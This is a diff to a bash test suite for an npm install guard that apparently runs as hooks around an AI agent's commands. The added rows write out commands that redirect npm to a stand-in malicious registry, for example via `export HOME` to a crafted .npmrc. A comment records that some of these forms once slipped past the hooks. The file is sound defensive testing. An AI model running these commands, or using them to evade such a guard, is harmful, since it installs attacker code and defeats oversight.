@@ -880,8 +880,10 @@ new_dp1() {
 # clone), and only what it brings in to a tree the hooks observed (UK2). The
 # later command installs the public sd-approved in another project. What
 # leaves npm's answer unknown here is a setting the gate reads but cannot
-# reproduce: `set -a` (UK0a, UK1a, UK2), `declare -x` (UK1d), an npm_config_*
-# assignment (UK1v), and `set -a` beside a `source` (MX1).
+# reproduce: `set -a` (UK0a, UK1a, UK2), a `declare -x` that changes the value
+# it stores (`-xi`, UK1d), an npm_config_* assignment (UK1v), and `set -a`
+# beside a `source` (MX1). A literal `declare -x` is carried to the ask like an
+# export (XH4).
 #
 # Code the command runs first is the exception (UK0, UK1, and the SRC rows):
 # after `source`, `.` or `eval`, where npm answers the public registry, the
@@ -907,7 +909,7 @@ new_uk0() { new_tree; unknown_first 'source ./sdenv.sh && npm install sd-swapped
 new_uk1() { new_clone; unknown_first 'source ./sdenv.sh && npm ci'; }
 new_uk0a() { new_tree; unknown_first 'set -a && npm install sd-swapped@1.0.0'; }
 new_uk1a() { new_clone; unknown_first 'set -a && npm ci'; }
-new_uk1d() { new_clone; unknown_first 'declare -x SD_BENIGN=1 && npm ci'; }
+new_uk1d() { new_clone; unknown_first 'declare -xi SD_BENIGN=1 && npm ci'; }
 new_uk1v() { new_clone; unknown_first 'npm_config_fund=false; npm ci'; }
 new_mx1() { new_clone; unknown_first 'set -a; source ./sdenv.sh && npm ci'; }
 new_uk2() {
@@ -958,6 +960,48 @@ new_vb1() { new_project; withhold_first ". /dev/null; ${RH3_FORM}"; }
 new_vb2() { new_project; withhold_first "eval true; export npm_config_registry=${EVIL_REG}; npm install sd-approved@1.0.0"; }
 new_vb3() { new_project; withhold_first "source /dev/null && export npm_config_registry=${EVIL_REG} && npm install sd-approved@1.0.0"; }
 new_ev1() { new_project; withhold_first "eval \"export npm_config_registry=${EVIL_REG}\"; npm install sd-approved@1.0.0"; }
+# The XH rows: an export that moves npm's configuration without naming an npm
+# setting. npm reads its user .npmrc from HOME, so `export HOME=<dir>` sends
+# the install to <dir>/.npmrc and the registry it names. The pre-guard's ask
+# carried only npm_config_* exports, so it answered under the hook's HOME, the
+# PostToolUse hook's ask did too, both said the public registry, and the first
+# command rebuilt the impostor (XH1-XH3 on e965c09). `declare -x` left the
+# answer unknown instead (XH4 there). An assignment the command does not
+# export reaches npm too, because HOME is exported already (XH5). The XC rows
+# are the forms the ask saw before: the same HOME in front of npm, through
+# env(1), and an exported NPM_CONFIG_REGISTRY. An exported value the shell
+# decides at run time leaves the answer unknown, and is recorded (XU1).
+#
+# The sandbox points npm at its userconfig through npm_config_userconfig,
+# which outranks HOME, so these rows run with it unset and the same file at
+# $HOME/.npmrc, and put it back before the row's own install.
+XH_HOME="${tmp_root}/xh-home"
+mkdir -p "${XH_HOME}"
+printf 'registry=%s\nprefix=%s\n' "${EVIL_REG}" "${tmp_root}/global" > "${XH_HOME}/.npmrc"
+home_first() {
+  local form="$1" userconfig="${npm_config_userconfig}"
+  new_project
+  cp "${userconfig}" "${HOME}/.npmrc"
+  unset npm_config_userconfig
+  [[ "$(cd "${CASE_PROJECT}" && npm config get registry 2>/dev/null)" == "${SAFEDEPS_NPM_TEST_REGISTRY}" ]] \
+    || fail "without npm_config_userconfig npm still reads the sandbox registry from \$HOME/.npmrc"
+  withhold_first "${form}"
+  export npm_config_userconfig="${userconfig}"
+  rm -f "${HOME}/.npmrc"
+  printf '%-4s %-7s %s | ran=[%s] post=[%s]\n' "${2}" first "${form}" \
+    "$(cut -f1,2 <<< "${CASE_RAN}" | tr '\t' ':' | paste -sd, -)" \
+    "$(jq -r '.systemMessage // empty' <<< "${CASE_POST}" 2>/dev/null | tr '\n' ' ' | head -c 300)"
+  [[ -z "${CASE_RAN}" ]] || note_failure "${2}: the first command rebuilds nothing, so no script of the impostor runs (${CASE_RAN})"
+}
+new_xh1() { home_first "export HOME=${XH_HOME}; npm install sd-approved@1.0.0" XH1; }
+new_xh2() { home_first "export HOME=${XH_HOME} && npm install sd-approved@1.0.0" XH2; }
+new_xh3() { home_first "HOME=${XH_HOME}; export HOME; npm install sd-approved@1.0.0" XH3; }
+new_xh4() { home_first "declare -x HOME=${XH_HOME}; npm install sd-approved@1.0.0" XH4; }
+new_xh5() { home_first "HOME=${XH_HOME}; npm install sd-approved@1.0.0" XH5; }
+new_xc1() { home_first "HOME=${XH_HOME} npm install sd-approved@1.0.0" XC1; }
+new_xc2() { home_first "env HOME=${XH_HOME} npm install sd-approved@1.0.0" XC2; }
+new_xc3() { home_first "export NPM_CONFIG_REGISTRY=${EVIL_REG}; npm install sd-approved@1.0.0" XC3; }
+new_xu1() { home_first "export HOME=\"\$PWD/../xh-home\"; npm install sd-approved@1.0.0" XU1; }
 
 # <id>|<fixture>|<engine>|<expect>|<command>, where <expect> is
 #   fallback            rolled back with no confirmed snapshot, said in all three records
@@ -1110,7 +1154,7 @@ UK0|uk0|claude|quiet:sd-approved|npm install sd-approved@1.0.0
 UK1|uk1|claude|quiet:sd-approved|npm install sd-approved@1.0.0
 UK0a|uk0a|claude|kept:the bytes of sd-approved here are the ones an install in @FIRST@ first fetched from a registry safedeps could not name (an earlier statement (set -a) can change the environment npm runs with|npm install sd-approved@1.0.0
 UK1a|uk1a|claude|kept:the bytes of sd-approved here are the ones an install in @FIRST@ first fetched from a registry safedeps could not name (an earlier statement (set -a) can change the environment npm runs with|npm install sd-approved@1.0.0
-UK1d|uk1d|claude|kept:the bytes of sd-approved here are the ones an install in @FIRST@ first fetched from a registry safedeps could not name (an earlier statement (declare -x) can change the environment npm runs with|npm install sd-approved@1.0.0
+UK1d|uk1d|claude|kept:the bytes of sd-approved here are the ones an install in @FIRST@ first fetched from a registry safedeps could not name (an earlier statement (declare -xi) can change the environment npm runs with|npm install sd-approved@1.0.0
 UK1v|uk1v|claude|kept:the bytes of sd-approved here are the ones an install in @FIRST@ first fetched from a registry safedeps could not name (an earlier statement (npm_config_fund=) can change the environment npm runs with|npm install sd-approved@1.0.0
 MX1|mx1|claude|kept:the bytes of sd-approved here are the ones an install in @FIRST@ first fetched from a registry safedeps could not name (an earlier statement (set -a) can change the environment npm runs with|npm install sd-approved@1.0.0
 UK2|uk2|claude|quiet:sd-approved|npm install sd-approved@1.0.0
@@ -1121,6 +1165,15 @@ VB1|vb1|claude|kept:${WITHHELD_EVIL}|npm install sd-swapped@1.0.0
 VB2|vb2|claude|kept:${WITHHELD_EVIL}|npm install sd-swapped@1.0.0
 VB3|vb3|claude|kept:${WITHHELD_EVIL}|npm install sd-swapped@1.0.0
 EV1|ev1|claude|kept:the bytes of sd-approved here are the ones an install in @FIRST@ first fetched from a registry safedeps could not name (an earlier statement (eval npm_config_registry) can change the environment npm runs with|npm install sd-swapped@1.0.0
+XH1|xh1|claude|kept:${WITHHELD_EVIL}|npm install sd-swapped@1.0.0
+XH2|xh2|claude|kept:${WITHHELD_EVIL}|npm install sd-swapped@1.0.0
+XH3|xh3|claude|kept:${WITHHELD_EVIL}|npm install sd-swapped@1.0.0
+XH4|xh4|claude|kept:${WITHHELD_EVIL}|npm install sd-swapped@1.0.0
+XH5|xh5|claude|kept:${WITHHELD_EVIL}|npm install sd-swapped@1.0.0
+XC1|xc1|claude|kept:${WITHHELD_EVIL}|npm install sd-swapped@1.0.0
+XC2|xc2|claude|kept:${WITHHELD_EVIL}|npm install sd-swapped@1.0.0
+XC3|xc3|claude|kept:${WITHHELD_EVIL}|npm install sd-swapped@1.0.0
+XU1|xu1|claude|kept:the bytes of sd-approved here are the ones an install in @FIRST@ first fetched from a registry safedeps could not name (|npm install sd-swapped@1.0.0
 ROWS
 [[ ${#FAILURES[@]} -ne ${failures_before} ]] \
   || pass "install scripts run only over a tree on record from the public registry or a workspace, a package counts as bundled only where its parent's package.json bundles it, a record on the public registry counts only where npm says it fetched from there, a rollback runs none without a confirmed snapshot and says what ran on each engine, and K4-K7 are installed but not rebuilt"
